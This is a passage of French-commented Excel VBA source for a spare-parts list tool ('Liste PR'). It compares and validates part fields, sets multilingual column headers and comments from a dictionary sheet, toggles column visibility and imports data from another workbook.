                            .Cells(i, P_Tech_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_Tech_Dec).Font.Bold = False
                        End If
                        
                        If Categorie_Dec <> Categorie_PR Then
                            .Cells(i, P_Categorie_Dec).Value = Categorie_PR
                            .Cells(i, P_Categorie_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_Tech_Dec).Font.Bold = False
                        End If
                        
                        If Document_Dec <> Document_PR Then
                            If VBA.Len(Document_PR) < 26 And Caracteres_Compatibles_GedTmi(Document_PR) Then
                                ' Prise en compte si document PR ok 15-04-2007
                                .Cells(i, P_document_Dec).Value = Document_PR
                                .Cells(i, P_document_Dec).Font.Bold = True
                                modif_ok = True
                            Else
                                .Cells(i, P_document_Dec).Font.Bold = False
                            End If
                        Else
                            .Cells(i, P_document_Dec).Font.Bold = False
                        End If
                        
                        If Obs_Dec <> Obs_PR Then
                            .Cells(i, P_Obs_Dec).Value = Obs_PR
                            .Cells(i, P_Obs_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_Obs_Dec).Font.Bold = False
                        End If
                        If Code_EAN_Dec <> Code_EAN_PR Then
                            .Cells(i, P_Code_EAN_Dec).Value = Code_EAN_PR
                            .Cells(i, P_Code_EAN_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_Code_EAN_Dec).Font.Bold = False
                        End If
                        '-----------------------
                        
                        Select Case Categorie_PR
                            Case "B", "F"
                                'Reponse UET reponse Ok le 20/03/2007
                                If Document_Dec <> Document_PR Then
                                    .Cells(i, P_document_Dec).Value = Document_PR
                                    .Cells(i, P_document_Dec).Font.Bold = True
                                    modif_ok = True
                                Else
                                    .Cells(i, P_document_Dec).Font.Bold = False
                                End If
                                
                            Case "C"
                                If Piece_rech_PR = "N" Then
                                       'Reponse UET reponse Ok le 20/03/2007
                                    If Document_Dec <> Document_PR Then
                                        If Document_PR = vbNullString Then .Cells(i, P_document_Dec).Value = "SP" Else .Cells(i, P_document_Dec).Value = Document_PR
                                        .Cells(i, P_document_Dec).Font.Bold = True
                                        modif_ok = True
                                    Else
                                        .Cells(i, P_document_Dec).Font.Bold = False
                                    End If
                                Else
                                    If Document_Dec <> Document_PR Then
                                        If Document_PR = vbNullString Then .Cells(i, P_document_Dec).Value = "SP" Else .Cells(i, P_document_Dec).Value = Document_PR
                                        .Cells(i, P_document_Dec).Font.Bold = True
                                        modif_ok = True
                                    Else
                                        .Cells(i, P_document_Dec).Font.Bold = False
                                    End If
                                End If
                        End Select
                        
                        If Piece_rech_Dec <> Piece_rech_PR Then
                            .Cells(i, P_Piece_rech_Dec).Value = Piece_rech_PR
                            .Cells(i, P_Piece_rech_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_Piece_rech_Dec).Font.Bold = False
                        End If
                        
                        'traitement des modifs
                        If modif_ok Then
                            .Cells(i, P_Date_modif_Dec).Value = VBA.Format(Now, "dd/mm/yyyy")
                            .Cells(i, P_Date_modif_Dec).Font.Bold = True
                        Else
                            WsMat.Cells(i, P_Date_modif_Dec).Font.Bold = False
                        End If
                    Else
                        If VBA.Mid(.Cells(i, P_Piece_rech_Dec).Value, 2, 1) = "V" Then
                            .Cells(i, P_Piece_rech_Dec).Value = VBA.Mid(WsMat.Cells(i, P_Piece_rech_Dec).Value, 1, 1)
                            .Cells(i, P_Date_modif_Dec).Value = VBA.Format(Now, "dd/mm/yyyy")
                            .Cells(i, P_Date_modif_Dec).Font.Bold = True
                        Else
                            .Cells(i, P_Date_modif_Dec).Font.Bold = False
                        End If
                    End If
                    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = i - 4
                Else
                    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = i - 4
                End If
                i = i + 1
            Loop
        End With
    End If
End Sub


'********************************
' recherche si l'|fffd|l|fffd|ment existe
'ACH, Est-ce utilis|fffd| ?
'********************************
Function Exist_PdR_1(Cle As String) As Boolean
    'Dim trouve As Integer
    Dim Fin As Boolean
    Dim i As Integer
    Dim Pos As String, Suf As String
        
    Ind_PR = 0
    i = 1
    Exist_PdR_1 = False
    Fin = False
    Do
        If i <= nb_element Then
            If tab_article(i) = Cle Then
                Fin = True
                Ind_PR = tab_ind(i)
                Exist_PdR_1 = True
                Pos = VBA.InStr(1, Cle, "_")
                Pos = VBA.InStr(Pos + 1, Cle, "_")
                If Pos > 0 Then Suf = VBA.Mid(Cle, Pos + 1, VBA.Len(Cle))
            Else
                i = i + 1
            End If
        Else
            Fin = True
        End If
    Loop Until Fin
End Function
Attribute VB_Name = "TDI_Mod_liste_PR"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   :
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 06/07/2005
'[Version       : V1.1 du 17/03/2009
'[---------------------------------------------------------------------------
'[Sujet:
'[---------------------------------------------------------------------------


' 08-11-2006    Jm  suppression des filtres Fonction importation
' 20-03-2007    Modif fonction controle
' on de demande plus de doc sur les article "C" si la pi|fffd|ce est de nature N
' on de demande plus le delais et le prix sur les article "C" si la pi|fffd|ce est de nature N
' 05-04-2007    reprise Bogue fonction ci dessus
' 18-09-2007    JM  reprise format des date
' 18-09-2007    Jm  reprise calcul prix de PR propos|fffd|
' 23-10-2007    Ajout de la date analyse dans feuille shCde_Nomenclature

Dim table_aff(200, 50) As String
Dim Chemin As Variant

Dim PathPdr     As String
Dim NameFilePdr As String


Sub Erreur_PdR(ByVal err As Boolean, Lig, Col As Integer, num_err As Variant)
    If err Then Cells(Lig, Col).Value = Cells(Lig, Col).Value & " " & num_err
End Sub


'Sub Analyse_PdR()
'    Dim Derniere_Ligne As Long
'    Dim Derniere_Colonne As Long
'    Dim Ligne As Long
'    Dim Colonne As Long
'    Dim Mes As String
'    'Dim err_format  As Variant
'    Dim ok, Fin As Boolean
'    Dim lg As Integer
    
'    Sheets(shPieces_Rechange).Select
'    Sheets(shPieces_Rechange).Activate
'    Derniere_Colonne = 35
'    ShowAllRecords (shPieces_Rechange)
'    Application.ScreenUpdating = False
'    Application.EnableEvents = False
'    Sheets(shAffaire).Range("Champ_Analyse_Dynamique").value = "N"
'    Derniere_Ligne = Worksheets(shPieces_Rechange).Cells(1, 1).End(xlDown).Row
'    Init_var_PR Worksheets(shPieces_Rechange)
'    Worksheets(shCde_Nomenclature).Cells(18, 4).Value = VBA.Date & " - " & VBA.Time
'    For Ligne = 6 To Derniere_Ligne
'        Lire_PR Worksheets(shPieces_Rechange), Ligne
'        err_format = vbnullstring ' raz erreur
'        If Num_ssen_PR <> "*" Then
        
'            Sheets(shPieces_Rechange).Cells(Ligne, 20).Value = vbnullstring
'            'Nouvel Algorythme ACH
'            Controle_Format_Ligne ThisWorkbook.Worksheets(shPieces_Rechange), Ligne
             
'         For Colonne = 1 To Derniere_Colonne
'             ok = False
'             Mes = Sheets(shPieces_Rechange).Cells(Ligne, Colonne).Value
'             Select Case Sheets(shPieces_Rechange).Cells(1, Colonne).Value
'                 Case 13
'                    If vba.len(Mes) > 10 Or vba.len(Mes) = 0 Then
'                        err_format = err_format + " P13"
'                    Else
'                        If Caracteres_Compatibles_GedTmi(Mes) = False Then err_format = err_format + " P13-1"
'                    End If
'                 Case 12 ' Rep|fffd|re
'                     If vba.len(Mes) > 8 Or vba.len(Mes) = 0 Then
'                         err_format = err_format + " P12"
'                     Else
'                         If Caracteres_Compatibles_GedTmi(Mes) = False Then err_format = err_format + " P12-1"
'                     End If
'                 Case 18
'                     If Mes = vbnullstring Then Sheets(shPieces_Rechange).Cells(Ligne, Colonne).Value = VBA.Date
'                     Cells(Ligne, P_Date_Modif_PR).Value = VBA.Format(Now, "dd/mm/yyyy")
'                 Case 19
'                     If Mes = "B" Or Mes = "C" Or Mes = "F" Or Mes = "R" Then
'
'                     Else
'                         err_format = err_format + " P19"
'                     End If
'                 Case 21 ' ref fournisseur
'                    err = 0
'                    lg = 40
'                    If Categorie_PR = "B" Or Categorie_PR = "R" Then
'                        lg = 10
'                        If vba.len(Mes) < lg Then err_format = err_format + "P21"
'                    End If
'                    If Categorie_PR = "F" Then lg = 25
'                    If Categorie_PR = "C" Then lg = 25
'                    'contr|fffd|le format
'                    If vba.len(Mes) > lg Or vba.len(Mes) = 0 Then
'                        err_format = err_format + "P21"
'                    Else
'                        If Document_PR = "SP" Then
'                            If Not Caracteres_Compatibles_Sacim(Mes) Then err_format = err_format + "P21-1"
'                        End If
'                        If Document_PR <> vbnullstring And Document_PR <> "SP" Then If Not Caracteres_Compatibles_Sacim(Mes) Then err_format = err_format + "P21-Art"
'                        If Document_PR = vbnullstring Then If Not Caracteres_Compatibles_GedTmi(Mes) Then err_format = err_format + "P21-doc"
'                    End If
'                 Case 23
'                    If vba.len(Mes) > 28 Then
'                        err_format = err_format + " P23"
'                    Else
'                        ' contr|fffd|le des interdit
'                        If Caracteres_Majuscules(Mes) = False Then err_format = err_format + " P23-1"
'                    End If
'
'                 Case 24 ' designation
'                    If vba.len(Mes) > 100 Then
'                        err_format = err_format + " P24"
'                    Else
'                        ' contr|fffd|le des interdit
'                        If Caracteres_Majuscules(Mes) = False Then err_format = err_format + " P24-1"
'                    End If
'
'                 Case 33 ' Sacim
'                     If vba.len(Mes) = 10 Or vba.len(Mes) = 0 Then
'                     Else
'                         Cells(Ligne, 20).Value = Cells(Ligne, 20).Value & " " & "P33"
'                     End If
'                 Case 29 ' Ref Int
'                    If vba.len(Mes) > 50 Then
'                        err_format = err_format + " P29"
'                    Else
'                        ' contr|fffd|le des interdit
'                        If Caracteres_Compatibles_GedTmi(Mes) = False Then err_format = err_format + " P29-1"
'                    End If
'                 Case 30 ' Nom Int
'                    If vba.len(Mes) > 28 Then
'                        err_format = err_format + " P30"
'                    Else
'                        ' contr|fffd|le des interdit
'                        If Caracteres_Majuscules(Mes) = False Then err_format = err_format + " P30-1"
'                    End If
'                 Case 32 ' qte
'                    If vba.len(Mes) > 15 Then
'                        err_format = err_format + " P32"
'                    Else
'                        ' contr|fffd|le des interdit
'                        If Caracteres_Numeriques(Mes) = False Then err_format = err_format + " P32-1"
'                    End If
'                 Case 50 ' qte propos|fffd|
'                    If vba.len(Mes) > 3 Then
'                        err_format = err_format + " P50"
'                    Else
'                        ' contr|fffd|le des interdit
'                        If Caracteres_Compatibles_GedTmi(Mes) = False Then err_format = err_format + " P50-1"
'                    End If
'                 Case 51 ' delais
'                    If VBA.Mid(Sheets(shPieces_Rechange).Cells(Ligne, 22).Value, 1, 1) <> "N" Then
'                        If vba.len(Mes) > 5 Then
'                            err_format = err_format + " P51"
'                        Else
'                            If Caracteres_Numeriques(Mes) = False Then
'                            val (Mes)
'                                err_format = err_format + " P51-1"
'                            Else
'                                If vba.len(Mes) = 0 And Categorie_PR = "C" And SacimMabec_PR = vbnullstring Then err_format = err_format + " P51-Obl"
'                                If vba.len(Mes) = 0 And Categorie_PR = "F" And SacimMabec_PR = vbnullstring Then err_format = err_format + " P51-Obl"
'                            End If
'                        End If
'                    End If
'                 Case 52 ' prix unitaire
'                    If VBA.Mid(Sheets(shPieces_Rechange).Cells(Ligne, 22).Value, 1, 1) <> "N" Then
'                        If vba.len(Mes) > 8 Then
'                            err_format = err_format + " P52"
'                        Else
'                        ' contr|fffd|le des interdit
'                            If Not Caracteres_Numeriques(VBA.Trim(Mes)) Then
'                                'val (mes)
'                                err_format = err_format + " P52-1"
'                            Else
'                                If vba.len(Mes) = 0 And Categorie_PR = "C" And SacimMabec_PR = vbnullstring Then err_format = err_format + " P52-Obl"
'                                If vba.len(Mes) = 0 And Categorie_PR = "F" And SacimMabec_PR = vbnullstring Then err_format = err_format + " P52-Obl"
'                            End If
'                        End If
'                    End If
'                 Case 53 ' prix des PR propos|fffd|s total
'                     On Error Resume Next
'                     Sheets(shPieces_Rechange).Cells(Ligne, P_Prix_Total_PR).Value = CDbl(val(Prix_PR)) * vba.val(Qte_propo_PR)
'
'                 Case 55 ' prix total
'                     On Error Resume Next
'
'                 Case 43 ' Fiche d'identification
'                    If vba.len(Mes) < 26 Then
'                        If Caracteres_Compatibles_GedTmi(Mes) Then
'                            Select Case Categorie_PR
'                            Case "C", "F"
'                            If VBA.Mid(Sheets(shPieces_Rechange).Cells(Ligne, 22).Value, 1, 1) <> "N" Then
'                                If Sheets(shPieces_Rechange).Cells(Ligne, 17).Value = vbnullstring Then err_format = err_format & " " & "P43-2"
'                                If Sheets(shPieces_Rechange).Cells(Ligne, 4).Value = vbnullstring And Sheets(shPieces_Rechange).Cells(Ligne, 17).Value = "SP" Then err_format = err_format & " " & "P43 obl"
'                            End If
'                            Case "B", "R"
'                            If VBA.Mid(Sheets(shPieces_Rechange).Cells(Ligne, 22).Value, 1, 1) <> "N" Then
'                                If Sheets(shPieces_Rechange).Cells(Ligne, 4).Value = vbnullstring And Sheets(shPieces_Rechange).Cells(Ligne, 17).Value = "SP" Then err_format = err_format & " " & "P43 obl"
'                            Else
'                                If vba.len(Mes) > 25 Then err_format = err_format & " " & "P43"
'                            End If
'                            Case Else
'                            If vba.len(Mes) > 25 Then
'                                err_format = err_format & " " & "P43"
'                                'Cells(Ligne, 20).Value = Sheets(shPieces_Rechange).Cells(Ligne, 20).Value & " " & "P43"
'                            Else
'                                err_format = err_format & " " & "P43-1"
'                                'Cells(Ligne, 20).Value = Sheets(shPieces_Rechange).Cells(Ligne, 20).Value & " " & "P43-1"
'                            End If
'                            End Select
'                        Else
'                            err_format = err_format & " " & "P43-1"
'                        End If
'                    Else
'                       err_format = err_format & " " & "P43"
'                    End If
'            End Select
'         Next

'         Application.StatusBar = "Ligne " & Ligne & " / " & Derniere_Ligne & " trait|fffd|e ..."
'         'Sheets(shPieces_Rechange).Cells(Ligne, 20).Value = err_format
'     Else
'         ' effacer l'erreur
'        Sheets(shPieces_Rechange).Cells(Ligne, 20).Value = vbnullstring
'     End If
'    Next
'    compte_anno
'    Application.StatusBar = vbnullstring
'    Application.ScreenUpdating = True
'    Sheets(shAffaire).Range("Champ_Analyse_Dynamique").value = "O"
'    Application.EnableEvents = True
'    On Error GoTo 0
'End Sub

Sub Init_list_PR(lg As String)
    Dim i, Colonne As Integer
    Dim Mes As String
    Dim Off_set_titre
    Dim Off_set_comment
    Dim Col_Pr  As String
    ' On inhibe l'analyse dynamique des donn|fffd|es saisies
    Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    ' On d|fffd|finit le d|fffd|calage de colonnes |fffd| utiliser dans la feuille "Dico" en fonction de la langue s|fffd|lectionn|fffd|e
    Select Case lg
    Case "FR"
        Off_set_titre = 3
        Off_set_comment = 6
    Case "SL"
        Off_set_titre = 21
        Off_set_comment = 22
    Case "SP"
        Off_set_titre = 30
        Off_set_comment = 31
    Case "GB"
        Off_set_titre = 39
        Off_set_comment = 40
    Case "RU"
        Off_set_titre = 48
        Off_set_comment = 49
    Case "PT"
        Off_set_titre = 57
        Off_set_comment = 58
    Case "RO"
        Off_set_titre = 66
        Off_set_comment = 67
    Case Else
        ' On prend le Fran|fffd|ais par d|fffd|faut
        Off_set_titre = 3
        Off_set_comment = 6
    End Select
    
    ' On balaie toutes les lignes de l'onglet 'Dico'
    For i = 3 To Nb_col_dico
        ' r|fffd|cup|fffd|ration du titre
        Mes = Sheets(shDico).Cells(i, Off_set_titre).Value
        Colonne = Sheets(shDico).Cells(i, 2).Value
        Sheets(shPieces_Rechange).Cells(2, Colonne).Value = Mes
        Mes = "                    " & Mes & " :" & VBA.Chr(10) & Sheets(shDico).Cells(i, Off_set_comment).Value
        Mes = Mes & VBA.Chr(10) + "Format : " + Sheets(shDico).Cells(i, 4).Value
        Select Case Colonne
            Case Is < 27 ' 0 |fffd| 26   A * Z
                Col_Pr = VBA.Chr(64 + Colonne)
            Case Is < 53 '27 |fffd| 52   ' A*
                Col_Pr = "A" + VBA.Chr(64 + Colonne - 26)
            Case Is < 79
                Col_Pr = "B" + VBA.Chr(64 + Colonne - 52)
            Case Is < 105
                Col_Pr = "C" + VBA.Chr(64 + Colonne - 78)
            Case Is < 131
                Col_Pr = "D" + VBA.Chr(64 + Colonne - 104)
            Case Is < 157
                Col_Pr = "E" + VBA.Chr(64 + Colonne - 130)
        End Select
        Col_Pr = Col_Pr + "2"
        Worksheets(shPieces_Rechange).Activate
        ' On modifie le commentaire
        Commentaire_Cellule shPieces_Rechange, Worksheets(shPieces_Rechange).Range(Col_Pr).row, Worksheets(shPieces_Rechange).Range(Col_Pr).Column, Mes
        'Worksheets(shPieces_Rechange).Range(Col_Pr).Activate
        'Selection.ShapeRange.ScaleWidth 1.68, msoFalse, msoScaleFromTopLeft
    Next i
    Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
End Sub


Sub init_PdR_FR()
    Init_list_PR ("FR")
End Sub

Sub Init_PdR_SL()
    Init_list_PR ("SL")
End Sub

Sub init_PdR_GB()
    Init_list_PR ("GB")
End Sub

Sub init_PdR_SP()
    Init_list_PR ("SP")
End Sub

Sub init_PdR_RU()
    Init_list_PR ("RU")
End Sub

Sub init_PdR_PT()
    Init_list_PR ("PT")
End Sub

Sub init_PdR_RO()
    Init_list_PR ("RO")
End Sub

'****************************
' affiche toutes les colonnes
'****************************
Sub Sel_Tout()
Worksheets(shPieces_Rechange).Columns("A:DX").Hidden = False
'Worksheets(shPieces_Rechange).Columns("U:AG").Hidden = True

End Sub

' Affichage "Liste PdR" d|fffd|fini dans l'onglet DICO
Sub Sel_PR()
    Dim i, Col, pos_lang As Integer
    Worksheets(shPieces_Rechange).Columns("U:DX").Hidden = True
    ' Quelle que soit la langue, on prend uniquement en consid|fffd|ration le param|fffd|trage FR en colonne 7
    pos_lang = 7
    ' On balaie toutes les lignes de l'onglet 'Dico'
    For i = 3 To Nb_col_dico
        If Sheets(shDico).Cells(i, pos_lang).Value <> "N" Or Sheets(shDico).Cells(i, pos_lang).Value = " " Then
            Col = Sheets(shDico).Cells(i, 2).Value
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = False
        Else
            Col = Sheets(shDico).Cells(i, 2).Value
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = True
        End If
    Next i
End Sub

' Affichage "Liste Unique" d|fffd|fini dans l'onglet DICO
Sub Sel_Unique()
    Dim i, Col, pos_lang As Integer
    Worksheets(shPieces_Rechange).Columns("U:DX").Hidden = True
    ' Quelle que soit la langue, on prend uniquement en consid|fffd|ration le param|fffd|trage FR en colonne 7
    pos_lang = 8
    ' On balaie toutes les lignes de l'onglet 'Dico'
    For i = 3 To Nb_col_dico
        If Sheets(shDico).Cells(i, pos_lang).Value <> "N" Or Sheets(shDico).Cells(i, pos_lang).Value = " " Then
            Col = Sheets(shDico).Cells(i, 2).Value
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = False
        Else
            Col = Sheets(shDico).Cells(i, 2).Value
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = True
        End If
    Next i
End Sub

' Affichage "Liste Globale" d|fffd|fini dans l'onglet DICO
Sub Sel_Global()
    Dim i, Col, pos_lang As Integer
    Worksheets(shPieces_Rechange).Columns("U:DX").Hidden = True
    ' Quelle que soit la langue, on prend uniquement en consid|fffd|ration le param|fffd|trage FR en colonne 7
    pos_lang = 9
    ' On balaie toutes les lignes de l'onglet 'Dico'
    For i = 3 To Nb_col_dico
        If Sheets(shDico).Cells(i, pos_lang).Value <> "N" Or Sheets(shDico).Cells(i, pos_lang).Value = " " Then
            Col = Sheets(shDico).Cells(i, 2).Value
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = False
        Else
             Col = Sheets(shDico).Cells(i, 2).Value '  jm01
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = True
        End If
    Next i

End Sub

' Affichage "Donn|fffd|es DCM" d|fffd|fini dans l'onglet DICO
Sub Sel_DCM()
    Dim i, Col, pos_lang As Integer
    Worksheets(shPieces_Rechange).Columns("A:DX").Hidden = True
    ' Quelle que soit la langue, on prend uniquement en consid|fffd|ration le param|fffd|trage FR en colonne 7
    pos_lang = 10
    ' On balaie toutes les lignes de l'onglet 'Dico'
    For i = 3 To Nb_col_dico
        'Or Sheets(shDico).Cells(i, pos_lang).Value = vbnullstring
        If Sheets(shDico).Cells(i, pos_lang).Value = "N" Then
            Col = Sheets(shDico).Cells(i, 2).Value
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = True
        Else
            Col = Sheets(shDico).Cells(i, 2).Value '  jm01
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = False
        End If
    Next i

End Sub

' Affichage "Donn|fffd|es DPG" d|fffd|fini dans l'onglet DICO
Sub Sel_DPG()
    Dim i, Col, pos_lang As Integer
    Worksheets(shPieces_Rechange).Columns("U:DX").Hidden = True
    ' Quelle que soit la langue, on prend uniquement en consid|fffd|ration le param|fffd|trage FR en colonne 7
    pos_lang = 11
    ' On balaie toutes les lignes de l'onglet 'Dico'
    For i = 3 To Nb_col_dico
        If Sheets(shDico).Cells(i, pos_lang).Value <> "N" Or Sheets(shDico).Cells(i, pos_lang).Value = " " Then
            Col = Sheets(shDico).Cells(i, 2).Value
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = False
        Else
            Col = Sheets(shDico).Cells(i, 2).Value '  jm01
            Worksheets(shPieces_Rechange).Columns(Col).Hidden = True
        End If
    Next i
End Sub


'*************************************************
' Pr|fffd|rim|fffd|tre de la liste
' deux cas sont |fffd| pr|fffd|voir
' - recup a partir du TDI
' - R|fffd|cup |fffd| partur d'une liste Pr
'      dans ce cas pr|fffd|voir r|fffd|cup|fffd|ration des ent|fffd|te
'*************************************************
Sub Charge_LPdR()

    Dim TypesFiles  As String
    Dim theTitle    As String

    PathPdr = FilesCls.PathWorkBook(ThisWorkbook, False)
    TypesFiles = IniCls.ReadStringIniLangage("MsgFile", "MsgFileTDI")
    theTitle = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportTDI")
    
    'Affichage de la boite des fichiers avec arr|fffd|t si demand|fffd|
    If FilesCls.Openfiles(FilesCls.PathWorkBook(ThisWorkbook, True), TypesFiles, theTitle, PathPdr, NameFilePdr) Then
        frmProgression.FlagAbandon = 0
        frmProgression.lblN|fffd|Traitement = 8
        frmProgression.Show
    End If

'    Dim i           As Integer
'    Dim j           As Integer
'    Dim Col         As Integer
'
'
'    Fic_dest = ActiveWorkbook.FullName
'   'Affichage_Tous_Onglets
'    Chemin = Application.GetOpenFilename("Fichiers Excel (*.xls), *.xls", , "S|fffd|lectionner le fichier de travail")
'    If (Chemin = vbnullstring) Or (Chemin = False) Then
'        Exit Sub
'    End If
'
'
'    j = 1
'    i = 1
'    'fic_dest = ActiveWorkbook.FullName
'    Do While i <> 0
'        i = vba.instr(j, Fic_dest, "\")
'        j = j + 1
'    Loop
'    i = vba.len(Fic_dest) - j + 2
'    Fic_dest = VBA.Right(Fic_dest, i)
'    Fic_dest = VBA.Left(Fic_dest, i - 4)
'
'    Fic_tra = Chemin
'    j = 1
'    i = 1
'    Do While i <> 0
'        i = vba.instr(j, Fic_tra, "\")
'        j = j + 1
'    Loop
'    i = vba.len(Fic_tra) - j + 2
'    Fic_tra = VBA.Right(Fic_tra, i)
'    Fic_tra = VBA.Left(Fic_tra, i - 4)
'
'    Application.EnableEvents = False
'    Workbooks.Open Filename:=Chemin
'    Workbooks(Fic_tra + ".xls").Activate
'
'    Application.EnableEvents = True
    
    'Sheets(shAffaire).Range("Champ_Analyse_Dynamique").value = "N"
    'On Error Resume Next
    
End Sub

Sub Import_Pdr()
    Dim wbSource    As Workbook
    Dim wbDest      As Workbook
    Dim MsgInfo     As String
    Dim Affaire     As String
    
    'Empecher l'ex|fffd|cution des Macros du TDI |fffd| importer
    frmProgression.UpdateProgress 0, IniCls.ReadStringIniLangage("MsgFWK", "MsgEnCours"), 0
    MsgInfo = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportOnglet")
    
    Application.ScreenUpdating = False
    Application.EnableEvents = False
    If WBooksCls.OpenBook(PathPdr, NameFilePdr, True) Then
        Application.ScreenUpdating = False
        Application.EnableEvents = False
        Set wbSource = Workbooks(NameFilePdr)
        Affaire = ShAffaire
        If Not SheetCls.Sheet_Exist(wbSource, ShAffaire) And SheetCls.Sheet_Exist(wbSource, "info") Then
            Affaire = "info"
        End If
        
        Set wbDest = ThisWorkbook 'ActiveWorkbook
        wbDest.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
        
        frmProgression.UpdateProgress 1 / 3, MsgInfo & " : " & ShAffaire, frmProgression.FlagAbandon
        If SheetCls.Sheet_Exist(wbSource, Affaire) Then Import_Affaire wbSource.Sheets(Affaire), wbDest.Sheets(ShAffaire)

        'Charge_LPdR_data
        If frmProgression.FlagAbandon = 0 Then
            frmProgression.UpdateProgress 2 / 3, MsgInfo & " : " & shPieces_Rechange, frmProgression.FlagAbandon
            Purge_Data shPieces_Rechange
            If SheetCls.Sheet_Exist(wbSource, shPieces_Rechange) Then
                Import_Pieces_Rechange wbSource.Worksheets(shPieces_Rechange), wbDest.Worksheets(shPieces_Rechange)
            End If
        End If
        
        wbDest.Worksheets(shPieces_Rechange).Activate
        frmProgression.UpdateProgress 1, IniCls.ReadStringIniLangage("MsgFWK", "MsgTermine"), 0
    
        wbDest.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
        Workbooks(wbSource.Name).Close savechanges:=False
        
        wbDest.Worksheets(shCde_Nomenclature).Cells(18, 2).Value = VBA.Date & " - " & VBA.Time
    End If
    Application.EnableEvents = True
    Application.ScreenUpdating = True
End Sub


'Public Sub Charge_LPdR_data()
'    Dim i  As Integer
'
'    Division = vbnullstring 'Usine
'    Fournisseur = vbnullstring 'Fournisseur
'    Projet = " ' projet"
'    Perimetre = vbnullstring
'    DCM = vbnullstring 'DCM
'    DPG = vbnullstring 'DPG
'
'    'Modif ACH le 03/06/2008
'    If Not SheetCls.Sheet_Exist(Workbooks(Fic_tra & ".xls"), shPieces_Rechange) Then
'        MsgBox "le Classeur : " & Fic_tra + ".xls" & " Ne contient pas de feuilles 'Liste PR'"
'        Exit Sub
'    End If
'
'    Workbooks(Fic_tra + ".xls").Worksheets(shPieces_Rechange).Activate
'    ShowAllRecords (shPieces_Rechange)
'    Workbooks(Fic_dest + ".xls").Worksheets(shPieces_Rechange).Activate
'    ShowAllRecords (shPieces_Rechange)
'
'    Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Range("A6:IV65000").Delete
'    On Error GoTo Fin_Charge_LPdR_data
'    Division = Workbooks(Fic_tra + ".xls").Sheets(shPieces_Rechange).Cells(3, 4).Value 'Usine
'    Fournisseur = Workbooks(Fic_tra + ".xls").Sheets(shPieces_Rechange).Cells(3, 13).Value 'Fournisseur
'    Projet = Workbooks(Fic_tra + ".xls").Sheets(shPieces_Rechange).Cells(3, 8).Value ' projet
'    Perimetre = Workbooks(Fic_tra + ".xls").Sheets(shPieces_Rechange).Cells(4, 9).Value ' Pr|fffd|rim|fffd|tre de la liste
'    DCM = Workbooks(Fic_tra + ".xls").Sheets(shPieces_Rechange).Cells(4, 56).Value 'DCM
'    DPG = Workbooks(Fic_tra + ".xls").Sheets(shPieces_Rechange).Cells(4, 66).Value 'DPG
'
'    Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Cells(3, 4).Value = Division 'Usine
'    Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Cells(3, 13).Value = Fournisseur 'Fournisseur
'    Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Cells(3, 8).Value = Projet ' projet
'    Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Cells(4, 9).Value = Perimetre
'    Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Cells(4, 56).Value = DCM 'DCM
'    Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Cells(4, 66).Value = DPG  'DPG
'
'    'Modif ACH du 15/09/2008
'    Nb_max_PR = Lastline(Workbooks(Fic_tra + ".xls").Worksheets(shPieces_Rechange))
'
'    For i = 6 To Nb_max_PR
'        val_range = VBA.LTrim(VBA.Str(i))
'        val_range = "A" + val_range + ":IV" + val_range
'        Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Range(val_range).Value = _
'        Workbooks(Fic_tra + ".xls").Sheets(shPieces_Rechange).Range(val_range).Value
'        val_range = VBA.LTrim(VBA.Str(i))
'        val_range = "A" + val_range + ":AA" + val_range
'        Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Range(val_range).Font.Color = vbBlack
'        Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Range(val_range).Font.Bold = False
'        With Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Range(val_range)
'            .HorizontalAlignment = xlGeneral
'            .VerticalAlignment = xlCenter
'            .WrapText = True
'            .Orientation = 0
'            .AddIndent = False
'            .IndentLevel = 0
'            .ShrinkToFit = False
'            .ReadingOrder = xlContext
'            .MergeCells = False
'        End With
'    Next i
'    ThisWorkbook.Worksheets(shPieces_Rechange).Select
'    val_range = VBA.LTrim(VBA.Str(Nb_max_PR))
'    val_range = "A6" + ":DX" + val_range
'    Workbooks(Fic_dest + ".xls").Sheets(shPieces_Rechange).Range(val_range).Select
'    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
'    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
'    With Selection.Borders(xlEdgeLeft)
'        .LineStyle = xlContinuous
'        .Weight = xlThin
'        .ColorIndex = xlAutomatic
'    End With
'    With Selection.Borders(xlEdgeTop)
'        .LineStyle = xlContinuous
'        .Weight = xlThin
'        .ColorIndex = xlAutomatic
'    End With
